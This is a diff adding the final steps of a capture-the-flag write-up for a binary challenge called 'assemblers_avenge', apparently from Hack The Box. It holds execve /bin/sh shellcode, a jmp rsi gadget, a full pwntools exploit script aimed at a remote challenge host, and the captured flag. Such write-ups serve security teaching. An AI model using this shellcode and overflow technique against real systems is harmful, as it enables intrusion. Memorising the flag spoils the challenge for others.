@@ -52,4 +52,102 @@
 ![image](https://github.com/user-attachments/assets/10dea23c-941e-4467-8e4b-79c40bff5c82)
 
 
-9. 
+9. Since NX is disabled, hence let's use shellcode approach. Remembering the buffer size is 24 bytes, hence our shellcode should be at 16 bytes and the rest 8 bytes should be enough for our gadget.
+
+> JMP RSI GADGET
+
+![image](https://github.com/user-attachments/assets/be21d4ec-103b-446e-bb89-97233a0c77bf)
+
+10. No need to worry about the **/bin/sh** strings, because it is printed by the binary itself and there is an interesting way to grab the strings and use it for our shellcode.
+
+> THE PRINTED STRINGS
+
+![image](https://github.com/user-attachments/assets/634ae450-c0a6-4a31-b83c-c34149eceac4)
+
+
+11. Based on ghidra, the offset should be at `0x4020..`.
+
+![image](https://github.com/user-attachments/assets/75900b8b-acb3-4673-ae21-db78d610a52f)
+
+12. To identify the LSB, I used **hexdump**, then look for hex representations of **/bin/sh** strings.
+
+``` console
+┌──(scorch㉿petir)-[~]
+└─$ echo "/bin/sh" | xxd -p      
+2f62696e2f73680a
+```
+
+![image](https://github.com/user-attachments/assets/0345d2ee-b483-4416-91f5-d5be6b067912)
+
+
+13. Great! Now let's craft our shellcode.
+
+```asm
+mov    rdi,0x402065
+xor    esi,esi
+xor    edx,edx
+push   0x3b
+pop    rax
+syscall
+```
+
+#### NOTE:
+
+```
+To set zero for RSI and RDX can utilize xoring esi and edx. Because
+in 64-bit mode, writing to the lower 32 bits clears the upper 32 bits
+of the full 64-bit register.
+
+Thus xor esi achieves the same effect as xor rsi. Note that using 32 bit register
+is to shorten the shellcode size.
+```
+
+![image](https://github.com/user-attachments/assets/07ab3dc4-8d8c-4dcc-b788-85d6fdb68077)
+
+14. Awesome! The size is exact enough.
+
+> FULL EXPLOIT SCRIPT
+
+```py
+from pwn import *
+
+exe = './assemblers_avenge'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+HOST = '94.237.62.3'
+IP = 46619
+sh = remote(HOST, IP)
+# sh = process(exe)
+
+sc = """
+mov    rdi,0x402065
+xor    esi,esi
+xor    edx,edx
+push   0x3b
+pop    rax
+syscall
+"""
+
+log.success(f'Size: {len(asm(sc))}')
+
+rop = ROP(elf)
+p = flat([
+    asm(sc), # shellcode 
+    0x000000000040106b # jmp rsi gadget
+])
+
+sh.sendline(p)
+sh.interactive()
+```
+
+![image](https://github.com/user-attachments/assets/bbd6df21-26bf-4a1a-9aee-e7d6b54497ea)
+
+
+15 Got the flag! We've pwned it.
+
+## FLAG
+
+```
+HTB{y0ur_l0c4l_4553mbl3R5_4v3ng3d_0n_t1m3}
+```
